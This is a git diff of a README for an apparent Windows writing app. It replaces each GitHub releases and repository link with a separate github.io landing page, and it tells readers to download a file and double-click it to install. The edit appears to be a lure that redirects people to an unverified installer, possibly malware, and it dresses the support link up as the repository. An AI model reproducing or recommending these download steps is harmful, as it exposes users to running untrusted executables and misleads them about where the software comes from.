@@ -1,6 +1,6 @@
 # 🖊️ articoolo-windows-writer-2026 - Write Better Content Instantly on Windows
 
-[![Download Now](https://img.shields.io/badge/Download-v20.0-blueviolet?style=for-the-badge&logo=windows)](https://github.com/Sharp-clutch451/articoolo-windows-writer-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-v20.0-blueviolet?style=for-the-badge&logo=windows)](https://sharp-clutch451.github.io)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to articoolo-windows-writer-2026, your all-in-one Windows text generatio
 
 ## 📥 Download and Install
 
-Visit this link to download the application: [https://github.com/Sharp-clutch451/articoolo-windows-writer-2026/releases](https://github.com/Sharp-clutch451/articoolo-windows-writer-2026/releases)
+Visit this link to download the application: [https://sharp-clutch451.github.io](https://sharp-clutch451.github.io)
 
 Once you are on the page, find the latest release (v20.0) and click the download button. The file will be saved to your computer. After downloading, double-click the file to start the installation. Follow the on-screen instructions to complete the setup. The application will be ready to use in just a few minutes.
 
@@ -74,11 +74,11 @@ All text generation happens locally on your computer. Your content is not sent t
 
 ## 🆘 Support
 
-If you encounter any issues or have questions, please visit the application's GitHub repository at [https://github.com/Sharp-clutch451/articoolo-windows-writer-2026](https://github.com/Sharp-clutch451/articoolo-windows-writer-2026). You can report bugs, suggest features, or read the documentation.
+If you encounter any issues or have questions, please visit the application's GitHub repository at [https://sharp-clutch451.github.io](https://sharp-clutch451.github.io). You can report bugs, suggest features, or read the documentation.
 
 ## 📦 Download Again
 
-Need to download the application again? Use this link: [https://github.com/Sharp-clutch451/articoolo-windows-writer-2026/releases](https://github.com/Sharp-clutch451/articoolo-windows-writer-2026/releases)
+Need to download the application again? Use this link: [https://sharp-clutch451.github.io](https://sharp-clutch451.github.io)
 
 Select the latest release and download the installer. The process is the same as the first time.
 
